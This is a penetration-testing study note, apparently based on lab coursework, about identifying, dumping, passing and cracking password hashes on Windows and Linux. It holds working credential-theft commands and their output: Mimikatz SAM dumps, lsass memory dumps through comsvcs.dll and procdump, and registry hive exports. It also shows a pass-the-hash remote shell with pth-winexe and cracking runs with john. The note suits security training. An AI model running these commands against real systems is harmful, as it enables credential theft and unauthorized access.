

When ID'ing a hash, there are 3 properties to consider:  
• Length  
• Char set used  
• Any special chars used.  
  
  
[hashid](hashid.md)  
  
[Hashes](Hashes.md)  
  
[Mimikatz](mimikatz.md)  
  
[pth-winexe](pth-winexe.md)

[winexe](winexe.md)

[john](john.md)

[hashcat](hashcat.md)  
  
  
Other hash dumping tools, including **pwdump**, **fgdump**, & **Windows Credential Editor** (**wce**), work well against older Windows os' like Windows XP and Windows Server2003.  


### Finding lsass PID:
```powershell
tasklist /fi "imagename eq lsass.exe"
```


  
### Mimikatz:

```powershell
C:\> C:\Tools\password_attacks\mimikatz.exe  
...  
mimikatz # privilege::debug  
Privilege '20' OK  
  
mimikatz # token::elevate  
Token Id  : 0  
User name :  
SID name  : NT AUTHORITY\SYSTEM  
  
740     {0;000003e7} 1 D 33697 NT AUTHORITY\SYSTEM  S-1-5-18  (04g,21p)  Primary  
 -> Impersonated !  
 * Process Token : {0;0002e0fe} 1 F 3790250  corp\offsec  S-1-5-21-3048852426-3234707088-723452474-1103  (12g,24p)  Primary  
 * Thread Token  : {0;000003e7} 1 D 3843007  NT AUTHORITY\SYSTEM  S-1-5-18  (04g,21p)  Impersonation (Delegation)  
  
mimikatz # lsadump::sam  
Domain : CLIENT251  
SysKey : 457154fe3c13064d8ce67ff93a9257cf  
Local SID : S-1-5-21-3426091779-1881636637-1944612440  
SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5  
...  
RID  : 000001f8 (504)  
User : WDAGUtilityAccount  
  Hash NTLM: 0c509cca8bcd12a26acf0d1e508cb028  
  
RID  : 000003e9 (1001)  
User : Offsec  
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```


### comsvcs.dll
```powershell
ps C:\windows\system32> .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```


### procdump.exe
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```


### reg.exe
```powershell
reg save hklm\sam <directory-to-save>\sam
reg save hklm\system <directory-to-save>\system
```


### Pass the Hash:

Allows an attacker to auth to a remote target by using a valid combo of _username_ and _NTLM/LM hash_ rather than a clear text password.  
- Possible because NTLM/LM password hashes aren't salted & remain static between sessions.  
- Can also use to auth to other systems containing that same user & hash.  
  
  
Use **pth-winexe** from the Passing-The-Hash toolkit (a modified version of **winexe**), which performs auth using the SMB protocol.  
  
To execute an application like cmd on the remote computer using the SMB protocol, admin privileges are required due to auth'ing to the administrative share C$ and subsequent creation of a Windows service.  
  
  
Using the hash we just had dumped from **mimikatz.exe**:  
```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd  
E_md4hash wrapper called.  
HASH PASS: Substituting user supplied NTLM HASH...  
Microsoft Windows [Version 10.0.16299.309]  
(c) 2017 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>
```


Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM version 1 or 2 format during the auth process.  

We can capture these hashes using MITM or poisoning attacks & either crack them or relay them.  
  
For example, some apps like IE and Windows Defender use the Web Proxy Auto-Discovery Protocol (WPAD) to detect proxy settings.  

If we are on the local network, we could poison these requests and force NetNTLM auth with a tool like _Responder.py_,  
	which creates a rogue WPAD server designed to exploit this security issue.  
Since poisoning is highly disruptive to other users, tools like Responder.py should never be used in the labs.  
  


### PW Cracking:

Brute forcing w/ [john](john.md):  
```bash
cat hash.txt  
WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028  
Offsec:2892d26cdf84d7a70e2eb3b9f05c425e  
  
sudo john hash.txt --format=NT  
Using default input encoding: UTF-8  
Rules/masks using ISO-8859-1  
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
```


Linux:  
```bash
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt  
  
john --rules --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt unshadowed.txt
```

  
[hashcat](hashcat.md):